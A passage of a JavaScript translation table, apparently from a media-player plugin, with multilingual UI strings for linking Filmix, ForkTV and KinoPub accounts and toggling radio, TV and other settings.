		ru: 'Добавить ТОКЕН от Filmix',
		uk: 'Додати ТОКЕН від Filmix',
		en: 'Add TOKEN from Filmix',
		be: 'Дадаць ТОКЕН ад Filmix',
		zh: '添加 Filmix 令牌',
		bg: 'Добавете TOKEN от Filmix',
		cs: 'Přidejte TOKEN z Filmix',
		fr: 'Ajouter un jeton de Filmix',
		he: 'הוסף TOKEN מ-Filmix',
		pt: 'Adicionar TOKEN do Filmix',
		ro: 'Adăugați TOKEN de la Filmix'
	},
	filmix_param_add_descr: {
		ru: 'Добавьте ТОКЕН для подключения подписки',
		uk: 'Додайте ТОКЕН для підключення передплати',
		en: 'Add a TOKEN to connect a subscription',
		be: 'Дадайце ТОКЕН для падключэння падпіскі',
		zh: '添加令牌以连接订阅',
		bg: 'Добавете TOKEN, за да свържете абонамент',
		cs: 'Přidejte TOKEN pro připojení předplatného',
		fr: 'Ajouter un TOKEN pour connecter un abonnement',
		he: 'הוסף TOKEN כדי לחבר מנוי',
		pt: 'Adicione um TOKEN para conectar uma assinatura',
		ro: 'Adăugați un TOKEN pentru a conecta un abonament'
	},
	filmix_param_placeholder: {
		ru: 'Например: nxjekeb57385b..',
		uk: 'Наприклад: nxjekeb57385b..',
		en: 'For example: nxjekeb57385b..',
		be: 'Напрыклад: nxjekeb57385b..',
		zh: '例如：nxjekeb57385b..',
		bg: 'Например: nxjekeb57385b..',
		cs: 'Například: nxjekeb57385b..',
		fr: 'Par exemple : nxjekeb57385b..',
		he: 'לדוגמה: nxjekeb57385b..',
		pt: 'Por exemplo: nxjekeb57385b..',
		ro: 'De exemplu: nxjekeb57385b..'
	},
	filmix_params_add_device: {
		ru: 'Добавить устройство на ',
		uk: 'Додати пристрій на ',
		en: 'Add Device to ',
		be: 'Дадаць прыладу на ',
		zh: '在以下位置添加设备：',
		bg: 'Добавяне на устройство към',
		cs: 'Přidat zařízení do',
		fr: 'Ajouter un appareil à',
		he: 'הוסף מכשיר ל',
		pt: 'Adicionar dispositivo a',
		ro: 'Adăugați dispozitiv la'
	},
	filmix_info_descr: {
		ru: 'Максимально доступное качество для просмотра без подписки - 720p. Для того, чтобы смотреть фильмы и сериалы в качестве - 1080р-2160р требуется подписка <b>PRO</b> или <b>PRO-PLUS</b> на сайте <span style="color: #24b4f9">filmix.my</span>',
		uk: 'Максимально доступна якість для перегляду без підписки – 720p.  Для того, щоб дивитися фільми та серіали як - 1080р-2160р потрібна підписка <b>PRO</b> або <b>PRO-PLUS</b> на сайтi <span style="color: #24b4f9">filmix.my</span>',
		en: 'The maximum available quality for viewing without a subscription is 720p.  In order to watch movies and series in quality - 1080p-2160p, you need a <b>PRO</b> or <b>PRO-PLUS</b> subscription to the site <span style="color: #24b4f9">filmix.my</span>',
		be: 'Максімальна даступная якасць для прагляду без падпіскі - 720p. Для прагляду фільмаў і серыялаў у якасці 1080p-2160p патрабуецца падпіска <b>PRO</b> або <b>PRO-PLUS</b> на сайце <span style="color: #24b4f9">filmix.my</span>',
		zh: '无订阅时最高画质为 720p。观看 1080p–2160p 需在 <span style="color: #24b4f9">filmix.my</span> 订阅 <b>PRO</b> 或 <b>PRO-PLUS</b>',
		bg: 'Максималното налично качество за гледане без абонамент е 720p. За да гледате филми и сериали с качество - 1080p-2160p е необходим <b>PRO</b> или <b>PRO-PLUS</b> абонамент за сайта <span style="color: #24b4f9">filmix.my</span>',
		cs: 'Maximální dostupná kvalita pro sledování bez předplatného je 720p. Abyste mohli sledovat filmy a seriály v kvalitě – 1080p-2160p, potřebujete předplatné <b>PRO</b> nebo <b>PRO-PLUS</b> na webu <span style="color: #24b4f9">filmix.my</span>',
		fr: 'La qualité maximale disponible pour une visualisation sans abonnement est de 720p. Afin de regarder des films et séries en qualité - 1080p-2160p, vous avez besoin d\'un abonnement <b>PRO</b> ou <b>PRO-PLUS</b> au site <span style="color: #24b4f9">filmix.my</span>',
		he: 'האיכות המרבית הזמינה לצפייה ללא מנוי היא 720p. על מנת לצפות בסרטים וסדרות באיכות - 1080p-2160p, יש צורך במנוי <b>PRO</b> או <b>PRO-PLUS</b> לאתר <span style="color: #24b4f9">filmix.my</span>',
		pt: 'A qualidade máxima disponível para visualização sem assinatura é 720p. Para assistir filmes e séries com qualidade - 1080p-2160p, você precisa de uma assinatura <b>PRO</b> ou <b>PRO-PLUS</b> do site <span style="color: #24b4f9">filmix.my</span>',
		ro: 'Calitatea maximă disponibilă pentru vizionare fără abonament este 720p. Pentru a viziona filme și seriale la calitate - 1080p-2160p, aveți nevoie de un abonament <b>PRO</b> sau <b>PRO-PLUS</b> pe site-ul <span style="color: #24b4f9">filmix.my</span>'
	},
	filmix_modal_text: {
		ru: 'Введите его на странице <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> в вашем авторизованном аккаунте! <br><br>Чтобы скопировать, нажмите на код.',
		uk: 'Введіть його на сторінці <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> у вашому авторизованому обліковому записі! <br><br>Щоб скопіювати, натисніть на код.',
		en: 'Enter it at <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> in your authorized account! <br><br>To copy, click on the code.',
		be: 'Увядзіце яго на старонцы <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> у вашым аўтарызаваным акаўнце! <br><br>Каб скапіяваць, націсніце на код.',
		zh: '在已登录账户的 <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> 页面输入！<br><br>点击代码可复制。',
		bg: 'Въведете го на <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> във вашия упълномощен акаунт! <br><br>За да копирате, щракнете върху кода.',
		cs: 'Zadejte jej na <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> ve svém autorizovaném účtu! <br><br>Pro zkopírování klikněte na kód.',
		fr: 'Entrez-le sur <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> dans votre compte autorisé ! <br><br>Pour copier, cliquez sur le code.',
		he: 'הזן אותו ב-<a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> בחשבון המורשה שלך! <br><br>כדי להעתיק, לחץ על הקוד.',
		pt: 'Insira-o em <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> em sua conta autorizada! <br><br>Para copiar, clique no código.',
		ro: 'Introduceți-l la <a href="https://filmix.my/consoles" target="_blank" style="color: yellow;">https://filmix.my/consoles</a> în contul dvs. autorizat! <br><br>Pentru a copia, faceți clic pe cod.'
	},
	filmix_modal_wait: {
		ru: 'Ожидаем код',
		uk: 'Очікуємо код',
		en: 'Waiting for the code',
		be: 'Чакаем код',
		zh: '等待代码',
		bg: 'Изчакване на кода',
		cs: 'Čekání na kód',
		fr: 'En attendant le code',
		he: 'מחכה לקוד',
		pt: 'Esperando pelo código',
		ro: 'În așteptarea codului'
	},
	filmix_copy_secuses: {
		ru: 'Код скопирован в буфер обмена',
		uk: 'Код скопійовано в буфер обміну',
		en: 'Code copied to clipboard',
		be: 'Код скапіяваны ў буфер абмену',
		zh: '代码已复制到剪贴板',
		bg: 'Кодът е копиран в клипборда',
		cs: 'Kód byl zkopírován do schránky',
		fr: 'Code copié dans le presse-papier',
		he: 'הקוד הועתק ללוח',
		pt: 'Código copiado para a área de transferência',
		ro: 'Cod copiat în clipboard'
	},
	filmix_copy_fail: {
		ru: 'Ошибка при копировании',
		uk: 'Помилка при копіюванні',
		en: 'Copy error',
		be: 'Памылка пры капіяванні',
		zh: '复制失败',
		bg: 'Грешка при копиране',
		cs: 'Chyba kopírování',
		fr: 'Erreur de copie',
		he: 'שגיאת העתקה',
		pt: 'Erro de cópia',
		ro: 'Eroare de copiere'
	},
	filmix_nodevice: {
		ru: 'Устройство не авторизовано',
		uk: 'Пристрій не авторизований',
		en: 'Device not authorized',
		be: 'Прылада не аўтарызавана',
		zh: '设备未授权',
		bg: 'Устройството не е оторизирано',
		cs: 'Zařízení není autorizováno',
		fr: 'Appareil non autorisé',
		he: 'מכשיר לא מורשה',
		pt: 'Dispositivo não autorizado',
		ro: 'Dispozitiv neautorizat'
	},
	filmix_auth_onl: {
		ru: 'Для просмотра в качестве 720p нужно добавить устройство в свой аккаунт на сайте filmix иначе будет заставка на видео.<br><br>Перейти в настройки и добавить?',
		uk: 'Для перегляду в якостi 720p потрібно додати пристрій до свого облікового запису на сайті filmix інакше буде заставка на відео.<br><br>Перейти до налаштувань і додати?',
		en: 'To view in 720p quality, you need to add a device to your account on the filmix website, otherwise there will be a splash screen on the video.<br><br>Go to settings and add?',
		be: 'Для прагляду ў якасці 720p трэба дадаць прыладу ў свой акаўнт на сайце filmix, інакш будзе застаўка на відэа.<br><br>Перайсці ў налады і дадаць?',
		zh: '观看 720p 需在 filmix 网站将设备添加到账户，否则会显示水印。<br><br>是否前往设置并添加？',
		bg: 'За да гледате с качество 720p, трябва да добавите устройство към акаунта си на уебсайта filmix, в противен случай ще има начален екран на видеоклипа.<br><br>Искате ли да отидете в настройките и да добавите?',
		cs: 'Chcete-li sledovat v kvalitě 720p, musíte ke svému účtu na webu filmix přidat zařízení, jinak se na videu zobrazí úvodní obrazovka.<br><br>Přejít do nastavení a přidat?',
		fr: 'Pour visionner en qualité 720p, vous devez ajouter un appareil à votre compte sur le site Web de filmix, sinon il y aura un écran de démarrage sur la vidéo.<br><br>Aller dans les paramètres et ajouter ?',
		he: 'לצפייה באיכות 720p צריך להוסיף מכשיר לחשבון באתר filmix, אחרת יהיה מסך פתיחה בסרטון.<br><br>עבור להגדרות והוסף?',
		pt: 'Para visualizar em qualidade 720p, você precisa adicionar um dispositivo à sua conta no site filmix, caso contrário, haverá uma tela inicial no vídeo.<br><br>Acessar configurações e adicionar?',
		ro: 'Pentru a viziona la calitate 720p, trebuie să adăugați un dispozitiv la contul dvs. pe site-ul filmix, altfel va apărea un ecran de introducere pe videoclip.<br><br>Accesați setări și adăugați?'
	},
	fork_auth_modal_title: {
		ru: '1. Авторизируйтесь на: <a style="color:#fff" href="#">http://forktv.me</a><br>2. Потребуется оформить подписку<br>3. В поле "Ваш ID/MAC" добавьте код',
		uk: '1. Авторизуйтесь на: <a style="color:#fff" href="#">http://forktv.me</a><br>2. Потрібно оформити передплату<br>3. У полі "Ваш ID/MAC" додайте код',
		en: '1. Log in to: <a style="color:#fff" href="#">http://forktv.me</a><br>2. Subscription required<br>3. In the "Your ID / MAC" field, add the code',
		be: '1. Аўтарызуйцеся на: <a style="color:#fff" href="#">http://forktv.me</a><br>2. Патрабуецца аформіць падпіску<br>3. У полі "Ваш ID/MAC" дадайце код',
		zh: '1. 在 <a style="color:#fff" href="#">http://forktv.me</a> 登录<br>2. 需办理订阅<br>3. 在「您的 ID/MAC」栏填写代码',
		bg: '1. Влезте в: <a style="color:#fff" href="#">http://forktv.me</a><br>2. Изисква се абонамент<br>3. В полето "Вашият ID / MAC" добавете кода',
		cs: '1. Přihlaste se na: <a style="color:#fff" href="#">http://forktv.me</a><br>2. Vyžaduje se předplatné<br>3. Do pole „Vaše ID / MAC“ zadejte kód',
		fr: '1. Connectez-vous à : <a style="color:#fff" href="#">http://forktv.me</a><br>2. Abonnement requis<br>3. Dans le champ "Votre ID/MAC", ajoutez le code',
		he: '1. היכנס אל: <a style="color:#fff" href="#">http://forktv.me</a><br>2. נדרש מנוי<br>3. בשדה "מזהה / MAC שלך", הוסף את הקוד',
		pt: '1. Faça login em: <a style="color:#fff" href="#">http://forktv.me</a><br>2. É necessária assinatura<br>3. No campo “Seu ID/MAC”, adicione o código',
		ro: '1. Conectați-vă la: <a style="color:#fff" href="#">http://forktv.me</a><br>2. Este necesar un abonament<br>3. În câmpul „ID/MAC”, adăugați codul'
	},
	fork_modal_wait: {
		ru: '<b style="font-size:1em">Ожидание идентификации кода</b><hr>После завершения идентификации произойдет перенаправление в обновленный раздел ForkTV',
		uk: '<b style="font-size:1em">Очiкуемо ідентифікації коду</b><hr>Після завершення ідентифікації відбудеться перенаправлення в оновлений розділ ForkTV',
		en: '<b style="font-size:1em">Waiting for code identification</b><hr>After identification is completed, you will be redirected to the updated ForkTV section',
		be: '<b style="font-size:1em">Чаканне ідэнтыфікацыі коду</b><hr>Пасля завершэння ідэнтыфікацыі адбудзецца перанакіраванне ў абноўлены раздзел ForkTV',
		zh: '<b style="font-size:1em">等待代码识别</b><hr>识别完成后将跳转到更新后的 ForkTV 页面',
		bg: '<b style="font-size:1em">Изчакване за идентификация на кода</b><hr>След като идентификацията приключи, ще бъдете пренасочени към актуализирания раздел на ForkTV',
		cs: '<b style="font-size:1em">Čekání na identifikaci kódu</b><hr>Po dokončení identifikace budete přesměrováni do aktualizované sekce ForkTV',
		fr: '<b style="font-size:1em">En attente de l\'identification du code</b><hr>Une fois l\'identification terminée, vous serez redirigé vers la section ForkTV mise à jour',
		he: '<b style="font-size:1em">ממתין לזיהוי קוד</b><hr>לאחר השלמת הזיהוי, תופנה למדור המעודכן של ForkTV',
		pt: '<b style="font-size:1em">Aguardando identificação do código</b><hr>Depois que a identificação for concluída, você será redirecionado para a seção atualizada do ForkTV',
		ro: '<b style="font-size:1em">Se așteaptă identificarea codului</b><hr>După finalizarea identificării, veți fi redirecționat către secțiunea ForkTV actualizată'
	},
	title_status: {
		ru: 'Статус',
		uk: 'Статус',
		en: 'Status',
		be: 'Статус',
		zh: '状态',
		bg: 'Статус',
		cs: 'Postavení',
		fr: 'Statut',
		he: 'סטָטוּס',
		pt: 'Status',
		ro: 'Stare'
	},
	season_ended: {
		ru: 'сезон завершён',
		uk: 'сезон завершено',
		en: 'season ended',
		be: 'сезон завершаны',
		zh: '季已完结',
		bg: 'сезонът приключи',
		cs: 'sezóna skončila',
		fr: 'saison terminée',
		he: 'העונה הסתיימה',
		pt: 'temporada terminou',
		ro: 'sezonul s-a încheiat'
	},
	season_from: {
		ru: 'из',
		uk: 'з',
		en: 'from',
		be: 'з',
		zh: '共',
		bg: 'от',
		cs: 'z',
		fr: 'depuis',
		he: 'מִן',
		pt: 'de',
		ro: 'din'
	},
	season_new: {
		ru: 'Новая',
		uk: 'Нова',
		en: 'New',
		be: 'Новая',
		zh: '新',
		bg: 'Нов',
		cs: 'Nový',
		fr: 'Nouvelle',
		he: 'חָדָשׁ',
		pt: 'Nova',
		ro: 'Nou'
	},
	info_attention: {
		ru: 'Внимание',
		uk: 'Увага',
		en: 'Attention',
		be: 'Увага',
		zh: '注意',
		bg: 'внимание',
		cs: 'Pozor',
		fr: 'Attention',
		he: 'תְשׁוּמַת לֵב',
		pt: 'Atenção',
		ro: 'Atenţie'
	},
	info_pub_descr: {
		ru: '<b>KinoPub</b> платный ресурс, просмотр онлайн с источника, а так же спортивные ТВ каналы будут доступны после покупки <b>PRO</b> в аккаунте на сайте',
		uk: '<b>KinoPub</b> платний ресурс, перегляд онлайн з джерела, а також спортивні ТБ канали будуть доступні після покупки <b>PRO</b> в обліковому записі на сайті',
		en: '<b>KinoPub</b> a paid resource, online viewing from a source, as well as sports TV channels will be available after purchasing <b>PRO</b> in your account on the site',
		be: '<b>KinoPub</b> платны рэсурс, прагляд онлайн з крыніцы, а таксама спартыўныя ТБ каналы будуць даступны пасля пакупкі <b>PRO</b> у акаўнце на сайце',
		zh: '<b>KinoPub</b> 为付费资源，在线观看及体育频道需在网站账户中购买 <b>PRO</b> 后可用',
		bg: '<b>KinoPub</b> платен ресурс, онлайн гледане от източник, както и спортни телевизионни канали ще бъдат достъпни след закупуване на <b>PRO</b> в акаунта ви на сайта',
		cs: '<b>KinoPub</b> placený zdroj, online sledování ze zdroje a také sportovní televizní kanály budou k dispozici po zakoupení <b>PRO</b> ve vašem účtu na webu',
		fr: '<b>KinoPub</b> une ressource payante, un visionnage en ligne à partir d\'une source, ainsi que des chaînes de télévision sportives seront disponibles après l\'achat de <b>PRO</b> dans votre compte sur le site',
		he: '<b>KinoPub</b> משאב בתשלום, צפייה מקוונת ממקור, כמו גם ערוצי טלוויזיה בספורט יהיו זמינים לאחר רכישת <b>PRO</b> בחשבון שלך באתר',
		pt: '<b>KinoPub</b> um recurso pago, visualização on-line de uma fonte, bem como canais de TV esportivos estarão disponíveis após a compra de <b>PRO</b> em sua conta no site',
		ro: '<b>KinoPub</b> o resursă plătită, vizionarea online dintr-o sursă, precum și canalele TV sportive vor fi disponibile după achiziționarea <b>PRO</b> în contul dvs. de pe site'
	},
	params_pub_on: {
		ru: 'Включить',
		uk: 'Увiмкнути',
		en: 'Enable',
		be: 'Уключыць',
		zh: '启用',
		bg: 'Активирайте',
		cs: 'Umožnit',
		fr: 'Activer',
		he: 'לְאַפשֵׁר',
		pt: 'Habilitar',
		ro: 'Permite'
	},
	params_pub_off: {
		ru: 'Выключить',
		uk: 'Вимкнути',
		en: 'Disable',
		be: 'Выключыць',
		zh: '禁用',
		bg: 'Деактивиране',
		cs: 'Zakázat',
		fr: 'Désactiver',
		he: 'השבת',
		pt: 'Desativar',
		ro: 'Dezactivați'
	},
	params_pub_on_descr: {
		ru: 'Отображает источник "<b>KinoPub</b>", а так же подборки. Для просмотра с тсточника, а так же ТВ спорт каналов <span style="color:#ffd402">требуется подписка<span>',
		uk: 'Відображає джерело "<b>KinoPub</b>", а також добірки.  Для перегляду з балансера, а також ТБ спорт каналів <span style="color:#ffd402">потрібна підписка<span>',
		en: 'Displays the "<b>KinoPub</b>" source as well as collections.  To view from the source, as well as TV sports channels <span style="color:#ffd402">subscription<span> is required',
		be: 'Адображае крыніцу "<b>KinoPub</b>", а таксама падборкі. Для прагляду з крыніцы, а таксама ТБ спартыўных каналаў <span style="color:#ffd402">патрабуецца падпіска</span>',
		zh: '显示来源「<b>KinoPub</b>」及合集。从该来源及体育频道观看 <span style="color:#ffd402">需订阅</span>',
		bg: 'Показва източника на „<b>KinoPub</b>“, както и колекции. За гледане от източника, както и телевизионни спортни канали е необходим <span style="color:#ffd402">абонамент<span>',
		cs: 'Zobrazuje zdroj "<b>KinoPub</b>" a také sbírky. Ke sledování ze zdroje i sportovních televizních kanálů je vyžadováno <span style="color:#ffd402">předplatné<span>',
		fr: 'Affiche la source "<b>KinoPub</b>" ainsi que les collections. Pour visionner à partir de la source ainsi que les chaînes de télévision sportives, un <span style="color:#ffd402">abonnement<span> est requis',
		he: 'מציג את המקור "<b>KinoPub</b>" כמו גם אוספים. כדי לצפות מהמקור, כמו גם ערוצי ספורט טלוויזיה נדרש <span style="color:#ffd402">הרשמה<span>',
		pt: 'Exibe a fonte "<b>KinoPub</b>" bem como as coleções. Para assistir a partir da fonte, bem como canais esportivos de TV, é necessária <span style="color:#ffd402">assinatura<span>',
		ro: 'Afișează sursa „<b>KinoPub</b>”, precum și colecțiile. Pentru a viziona de la sursă, precum și canalele de sport TV este necesar <span style="color:#ffd402">abonament<span>'
	},
	params_pub_add_source: {
		ru: 'Установить источник',
		uk: 'Встановити джерело',
		en: 'Set source',
		be: 'Усталяваць крыніцу',
		zh: '设置来源',
		bg: 'Задайте източник',
		cs: 'Nastavit zdroj',
		fr: 'Définir la source',
		he: 'הגדר מקור',
		pt: 'Definir origem',
		ro: 'Setați sursa'
	},
	pub_source_add_noty: {
		ru: 'KinoPub установлен источником по умолчанию',
		uk: 'KinoPub встановлений стандартним джерелом',
		en: 'KinoPub set as default source',
		be: 'KinoPub устаноўлены крыніцай па змаўчанні',
		zh: 'KinoPub 已设为默认来源',
		bg: 'KinoPub е зададен като източник по подразбиране',
		cs: 'KinoPub nastaven jako výchozí zdroj',
		fr: 'KinoPub défini comme source par défaut',
		he: 'KinoPub מוגדר כמקור ברירת מחדל',
		pt: 'KinoPub definido como fonte padrão',
		ro: 'KinoPub setat ca sursă implicită'
	},
	descr_pub_settings: {
		ru: 'Настройки сервера, типа потока...',
		uk: 'Налаштування сервера типу потоку...',
		en: 'Server settings, stream type...',
		be: 'Налады сервера, тыпу патоку...',
		zh: '服务器、流类型等设置…',
		bg: 'Настройки на сървъра, тип поток...',
		cs: 'Nastavení serveru, typ streamu...',
		fr: 'Paramètres du serveur, type de flux...',
		he: 'הגדרות שרת, סוג זרם...',
		pt: 'Configurações do servidor, tipo de stream...',
		ro: 'Setări server, tip de flux...'
	},
	params_pub_add_source_descr: {
		ru: 'Установить источник по умолчанию на KinoPub',
		uk: 'Встановити стандартне джерело на KinoPub',
		en: 'Set Default Source to KinoPub',
		be: 'Усталяваць крыніцу па змаўчанні на KinoPub',
		zh: '将 KinoPub 设为默认来源',
		bg: 'Задайте източник по подразбиране на KinoPub',
		cs: 'Nastavte Výchozí zdroj na KinoPub',
		fr: 'Définir la source par défaut sur KinoPub',
		he: 'הגדר את מקור ברירת המחדל ל-KinoPub',
		pt: 'Definir fonte padrão para KinoPub',
		ro: 'Setați Sursa implicită la KinoPub'
	},
	params_pub_update_tocken: {
		ru: 'Обновить токен',
		uk: 'Оновити токен',
		en: 'Update token',
		be: 'Абнавіць токен',
		zh: '更新令牌',
		bg: 'Актуализиране на токена',
		cs: 'Aktualizovat token',
		fr: 'Mettre à jour le jeton',
		he: 'עדכון אסימון',
		pt: 'Atualizar token',
		ro: 'Jeton de actualizare'
	},
	params_pub_dell_device: {
		ru: 'Удалить привязку устройства',
		uk: 'Видалити прив\'язку пристрою',
		en: 'Remove device link',
		be: 'Выдаліць прывязку прылады',
		zh: '解除设备绑定',
		bg: 'Премахнете връзката към устройството',
		cs: 'Odebrat odkaz na zařízení',
		fr: 'Supprimer le lien de l\'appareil',
		he: 'הסר קישור למכשיר',
		pt: 'Remover link do dispositivo',
		ro: 'Eliminați legătura dispozitivului'
	},
	params_pub_dell_descr: {
		ru: 'Будет удалено устройство с прывязаных устройств в аккаунте',
		uk: 'Буде видалено пристрій із прив\'язаних пристроїв в обліковому записі',
		en: 'The device will be removed from linked devices in the account',
		be: 'Прылада будзе выдалена з прывязаных прылад у акаўнце',
		zh: '该设备将从账户的已绑定设备中移除',
		bg: 'Устройството ще бъде премахнато от свързаните устройства в акаунта',
		cs: 'Zařízení bude odebráno z propojených zařízení v účtu',
		fr: 'L\'appareil sera supprimé des appareils liés dans le compte',
		he: 'המכשיר יוסר מהמכשירים המקושרים בחשבון',
		pt: 'O dispositivo será removido dos dispositivos vinculados na conta',
		ro: 'Dispozitivul va fi eliminat de pe dispozitivele conectate din cont'
	},
	params_radio_enable: {
		ru: 'Включить радио',
		uk: 'Увiмкнути радiо',
		en: 'Enable radio',
		be: 'Уключыць радыё',
		zh: '启用电台',
		bg: 'Активиране на радиото',
		cs: 'Povolit rádio',
		fr: 'Activer la radio',
		he: 'אפשר רדיו',
		pt: 'Habilitar rádio',
		ro: 'Activați radioul'
	},
	params_radio_enable_descr: {
		ru: 'Отображает пункт "Радио" в главном меню с популярными радио-станциями',
		uk: 'Відображає пункт "Радіо" в головному меню з популярними радіостанціями',
		en: 'Displays the item "Radio" in the main menu with popular radio stations',
		be: 'Адображае пункт "Радыё" ў галоўным меню з папулярнымі радыёстанцыямі',
		zh: '在主菜单显示「电台」及热门电台',
		bg: 'Показва елемента "Радио" в главното меню с популярни радиостанции',
		cs: 'Zobrazí položku „Rádio“ v hlavní nabídce s oblíbenými rozhlasovými stanicemi',
		fr: 'Affiche l\'élément "Radio" dans le menu principal avec les stations de radio populaires',
		he: 'מציג את הפריט "רדיו" בתפריט הראשי עם תחנות רדיו פופולריות',
		pt: 'Exibe o item "Rádio" no menu principal com estações de rádio populares',
		ro: 'Afișează elementul „Radio” în meniul principal cu posturi de radio populare'
	},
	params_tv_enable: {
		ru: 'Включить ТВ',
		uk: 'Увiмкнути ТВ',
		en: 'Enable TV',
		be: 'Уключыць ТБ',
		zh: '启用电视',
		bg: 'Активирайте телевизия',
		cs: 'Povolit TV',
		fr: 'Activer la télévision',
		he: 'אפשר טלוויזיה',
		pt: 'Ativar TV',
		ro: 'Activați televizorul'
	},
	params_tv_enable_descr: {
		ru: 'Отображает пункт "Modss-TV" в главном меню с популярными каналами',
		uk: 'Відображає пункт "Modss-TV" в головному меню з популярними каналами',
		en: 'Displays the item "Modss-TV" in the main menu with popular channels',
		be: 'Адображае пункт "Modss-TV" у галоўным меню з папулярнымі каналамі',
		zh: '在主菜单显示「Modss-TV」及热门频道',
		bg: 'Показва елемента "Modss-TV" в главното меню с популярни канали',
		cs: 'Zobrazí položku „Modss-TV“ v hlavní nabídce s oblíbenými kanály',
		fr: 'Affiche l\'élément "Modss-TV" dans le menu principal avec les chaînes populaires',
		he: 'מציג את הפריט "Modss-TV" בתפריט הראשי עם ערוצים פופולריים',
		pt: 'Exibe o item "Modss-TV" no menu principal com canais populares',
		ro: 'Afișează elementul „Modss-TV” în meniul principal cu canale populare'
	},
	params_collections_descr: {
		ru: 'Добавляет в пункт "Подборки" популярные разделы, такие как Rezka, Filmix, KinoPub',
		uk: 'Додає до пункту "Підбірки" популярні розділи, такі як Rezka, Filmix, KinoPub',
		en: 'Adds to "Collections" popular sections such as Rezka, Filmix, KinoPub',
		be: 'Дадае да пункту "Падборкі" папулярныя раздзелы, такія як Rezka, Filmix, KinoPub',
		zh: '在「合集」中加入热门分类，如 Rezka、Filmix、KinoPub',
		bg: 'Добавя към „Колекции“ популярни раздели като Rezka, Filmix, KinoPub',
		cs: 'Přidává do "Sbírek" oblíbené sekce jako Rezka, Filmix, KinoPub',
		fr: 'Ajoute aux "Collections" des sections populaires telles que Rezka, Filmix, KinoPub',
		he: 'מוסיף ל"אוספים" קטעים פופולריים כמו Rezka, Filmix, KinoPub',
		pt: 'Adiciona seções populares às "Coleções", como Rezka, Filmix, KinoPub',
		ro: 'Adaugă la „Colecții” secțiuni populare precum Rezka, Filmix, KinoPub'
	},
	params_styles_title: {
		ru: 'Стилизация',
		uk: 'Стилізація',
		en: 'Stylization',
		be: 'Стылізацыя',
		zh: '样式',
		bg: 'Стилизация',
		cs: 'Stylizace',
		fr: 'Stylisation',
		he: 'סטייליזציה',
		pt: 'Estilização',
		ro: 'Stilizare'
	},
	placeholder_password: {
		ru: 'Введите пароль',
		uk: 'Введіть пароль',
		en: 'Enter password',
		be: 'Увядзіце пароль',
		zh: '输入密码',
		bg: 'Въведете парола',
		cs: 'Zadejte heslo',
		fr: 'Entrez le mot de passe',
		he: 'הזן סיסמה',
		pt: 'Digite a senha',
		ro: 'Introduceți parola'
	},
	title_parent_contr: {
		ru: 'Родительский контроль',
		uk: 'Батьківський контроль',
		en: 'Parental control',
		be: 'Бацькоўскі кантроль',
		zh: '家长控制',
		bg: 'Родителски контрол',
		cs: 'Rodičovská kontrola',
		fr: 'Contrôle parental',
		he: 'בקרת הורים',
		pt: 'Controle dos pais',
		ro: 'Controlul parental'
	},
	title_addons: {
		ru: 'Дополнения',
		uk: 'Додатки',
		en: 'Add-ons',
		be: 'Дадаткі',
		zh: '扩展',
		bg: 'Добавки',
		cs: 'Doplňky',
		fr: 'Modules complémentaires',
		he: 'תוספות',
		pt: 'Complementos',
		ro: 'Suplimente'
	},
	onl_enable_descr: {
		ru: 'Позволяет просматривать фильмы, сериалы в режиме Stream',
		uk: 'Дозволяє переглядати фільми, серіали в режимі Stream',
		en: 'Allows you to watch movies, series in Stream mode',
		be: 'Дазваляе праглядаць фільмы, серыялы ў рэжыме Stream',
		zh: '支持以流媒体模式观看电影、剧集',
		bg: 'Позволява ви да гледате филми, сериали в режим Stream',
		cs: 'Umožňuje sledovat filmy, seriály v režimu Stream',
		fr: 'Permet de regarder des films, des séries en mode Stream',
		he: 'מאפשר לך לצפות בסרטים, סדרות במצב Stream',
		pt: 'Permite assistir filmes, séries no modo Stream',
		ro: 'Vă permite să vizionați filme, seriale în modul Stream'
	},
	fork_enable_descr: {
		ru: 'Отображает пункт <b>"ForkTV"</b> в главном меню с популярными источниками, торрентами',
		uk: 'Відображає пункт <b>"ForkTV"</b> у головному меню з популярними джерелами, торрентами',
		en: 'Displays <b>"ForkTV"</b> item in main menu with popular sources, torrents',
		be: 'Адображае пункт <b>"ForkTV"</b> у галоўным меню з папулярнымі крыніцамі, торэнтамі',
		zh: '在主菜单显示 <b>ForkTV</b>，含热门来源与种子',
		bg: 'Показва елемента <b>"ForkTV"</b> в главното меню с популярни източници, торенти',
		cs: 'Zobrazuje položku <b>"ForkTV"</b> v hlavní nabídce s oblíbenými zdroji, torrenty',
		fr: 'Affiche l\'élément <b>"ForkTV"</b> dans le menu principal avec les sources populaires et les torrents',
		he: 'מציג פריט <b>"ForkTV"</b> בתפריט הראשי עם מקורות פופולריים, טורנטים',
		pt: 'Exibe o item <b>"ForkTV"</b> no menu principal com fontes populares, torrents',
		ro: 'Afișează elementul <b>„ForkTV”</b> în meniul principal cu surse populare, torrente'
	},
	title_fork_edit_cats: {
		ru: 'Изменить разделы',
		uk: 'Змінити розділи',
		en: 'Edit Sections',
		be: 'Змяніць раздзелы',
		zh: '编辑分类',
		bg: 'Редактиране на секции',
		cs: 'Upravit sekce',
		fr: 'Modifier les sections',
		he: 'ערוך קטעים',
		pt: 'Editar seções',
		ro: 'Editați secțiuni'
	},
	title_fork_add_cats: {
		ru: 'Добавить разделы',
		uk: 'Додати розділи',
		en: 'Add Sections',
		be: 'Дадаць раздзелы',
		zh: '添加分类',
		bg: 'Добавете секции',
		cs: 'Přidat sekce',
		fr: 'Ajouter des sections',
		he: 'הוסף קטעים',
		pt: 'Adicionar seções',
		ro: 'Adăugați secțiuni'
	},
	title_fork_clear: {
		ru: 'Очистить разделы',
		uk: 'Очистити розділи',
		en: 'Clear Sections',
		be: 'Ачысціць раздзелы',
		zh: '清空分类',
		bg: 'Изчистване на секции',
		cs: 'Vymazat sekce',
		fr: 'Effacer les sections',
